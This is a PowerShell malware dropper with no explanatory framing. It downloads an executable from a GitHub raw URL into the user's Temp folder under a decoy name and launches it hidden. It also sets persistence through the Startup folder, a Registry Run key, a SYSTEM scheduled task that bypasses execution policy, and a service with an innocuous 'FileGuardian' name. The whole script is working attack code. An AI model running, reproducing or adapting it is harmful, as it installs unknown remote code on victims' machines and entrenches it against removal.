# 📌 Variables:
$FileURL       = "https://raw.githubusercontent.com/wetiee/oculushelp/main/rapid.exe"
$TargetPath    = "$env:LOCALAPPDATA\Temp\katysaneur.exe"
$LaunchDelay   = 3
$WindowStyle   = "Hidden"

$StartupScriptPath   = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\FileGuardian.ps1"
$StartupRegPath  = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$TaskName       = "FileGuardianTask"
$TaskPath       = "C:\Windows\System32\Tasks\FileGuardianTask.xml"
$ServiceName    = "FileGuardianService"

# 📌 Function: Set persistence via Startup folder, Registry, and Service
function Set-Persistence {
    try {
        # Copy this script to Startup folder
        if (-not (Test-Path $StartupScriptPath)) {
            Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $StartupScriptPath -Force
        }

        # Add Registry Run key for persistence
        $command = "powershell.exe -windowstyle $WindowStyle -executionpolicy bypass -file `"$StartupScriptPath`""
        Set-ItemProperty -Path $StartupRegPath -Name "FileGuardian" -Value $command -Force

        # Create a scheduled task for persistence
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-windowstyle $WindowStyle -executionpolicy bypass -file `"$StartupScriptPath`""
        $trigger = New-ScheduledTaskTrigger -AtStartup
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
        $task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $settings
        Register-ScheduledTask -TaskName $TaskName -InputObject $task -Force

        # Create a Windows service for persistence
        $servicePath = "$env:SystemRoot\System32\svchost.exe"
        $serviceArgs = "-k netsvcs -p -s $ServiceName"
        $service = New-Service -Name $ServiceName -BinaryPathName "$servicePath $serviceArgs" -StartupType Automatic -Description "File Guardian Service"
        Start-Service -Name $ServiceName

        Write-Host "[+] Persistence established."
    }
    catch {
        Write-Host "[!] Failed to set persistence: $_"
    }
}

# 📌 Function: Download & Run file (always run, download if missing)
function Run-Payload {
    try {
        if (-not (Test-Path $TargetPath)) {
            Write-Host "[*] File not found — downloading..."
            Invoke-WebRequest -Uri $FileURL -OutFile $TargetPath
        }

        Start-Sleep -Seconds $LaunchDelay

        # Execute downloaded file hidden
        Start-Process -FilePath $TargetPath -WindowStyle $WindowStyle

        Write-Host "[+] Executed: $TargetPath"
    }
    catch {
        Write-Host "[!] Failed to download or launch file: $_"
    }
}

# 📌 Main execution:
Set-Persistence
Run-Payload